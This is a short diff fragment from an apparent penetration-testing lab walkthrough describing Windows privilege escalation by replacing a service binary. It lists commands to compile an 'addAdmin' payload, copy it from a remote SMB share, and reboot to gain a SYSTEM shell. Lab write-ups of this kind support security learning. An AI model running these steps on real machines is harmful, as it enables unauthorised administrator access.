@@ -161,10 +161,3 @@ Cross-compile for Windows: i686-w64-mingw32-gcc addAdmin.c -o bd.exe
 Move the existing bd.exe: move bd.exe bd.service.exe
 Copy the new malicious bd.exe: copy \\192.168.49.237\ROPNOP\bd.exe .
 Now restart the system: shutdown /r. We should be able to catch a shell as SYSTEM.
-
-
-
-
-
-
-
